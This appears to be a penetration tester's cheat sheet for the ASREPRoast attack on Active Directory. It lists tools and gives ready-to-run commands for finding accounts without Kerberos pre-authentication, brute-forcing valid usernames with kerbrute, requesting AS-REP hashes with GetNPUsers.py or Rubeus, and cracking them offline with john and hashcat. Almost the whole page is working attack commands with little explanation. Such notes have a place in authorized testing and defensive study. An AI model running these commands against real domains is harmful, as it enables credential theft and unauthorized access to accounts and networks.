# Overview
ASREPRoast is a security attack that exploits users who lack the **[[88 - Kerberos]] pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

## Prerequisites
- No Kerberos pre-authentication
- Ability to connect to the DC
- *Optional*: Having a domain account. This allows the attacker to identify users through LDAP. Without this account, the attacker has to guess the usernames.

## Tools
- [Rubeus Release](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_x64/Rubeus.exe)
- [Impacket - GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [optional - kerbrute](https://github.com/ropnop/kerbrute)


# Main Enumeration 
Here we enumerate vulnerable users.
**Windows**
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired -verbose
```

**Linux**
```bash
bloodyAD -u <USER> -p 'PASSWORD' -d <DOMAIN> --host <IP> get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

# Optional Enumeration
A tool to quickly brute force and enumerate valid Active Directory accounts through Kerberos Pre-Authentication
```bash
./kerbrute userenum --dc <IP> -d <DOMAIN> <USERS>
```

# Request AS_REP message (Exploit)
**Linux**
```bash
# Try all the usernames the file provided
python GetNPUsers.py <DOMAIN>/ -usersfile <USER_FILE> -format hashcat -outputfile <HASHES_OUT>
# Use domain creds to extract targets and target them
python GetNPUsers.py <DOMAIN>/USER:PASSWORD -request -format hashcat -outputfile <HASHES_OUT>
```

**Windows**
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username USER -verbose
```


# Cracking Hashes
```bash
john --wordlist=<CLEAR_PASS> <HASHES_OUT>
hashcat -m 18200 --force -a 0 <HASHES_OUT> <CLEAR_PASS>
```


# References
- [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)